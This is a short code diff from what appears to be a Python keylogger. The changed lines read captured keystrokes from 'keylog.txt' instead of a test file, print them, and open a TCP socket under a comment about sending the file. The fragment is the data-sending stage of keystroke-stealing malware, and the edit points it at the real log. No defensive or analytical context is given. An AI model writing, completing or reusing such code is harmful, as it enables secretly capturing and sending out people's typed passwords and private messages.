@@ -1,7 +1,7 @@
 #=============================================
 #sending txt file
 
-f = open('keylogtest.txt', 'r')
+f = open('keylog.txt', 'r')
 strf = str(f.read())
 print(strf)
 eggs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
